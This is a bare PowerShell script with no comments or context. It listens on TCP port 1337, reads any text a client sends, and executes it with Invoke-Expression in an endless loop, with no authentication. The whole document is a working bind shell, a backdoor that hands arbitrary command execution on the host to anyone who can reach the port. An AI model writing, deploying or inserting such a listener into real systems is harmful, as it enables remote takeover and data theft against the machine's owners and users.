$port = 1337
$listener = [System.Net.Sockets.TcpListener]::new($port)
$listener.Start()
Write-Host "Listening on port $port..."

while ($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $cmd = $reader.ReadToEnd()

    Write-Host "Received command: $cmd"

    try {
        Invoke-Expression $cmd
    } catch {
        Write-Host "Execution error: $_"
    }

    $reader.Close()
    $stream.Close()
    $client.Close()
}
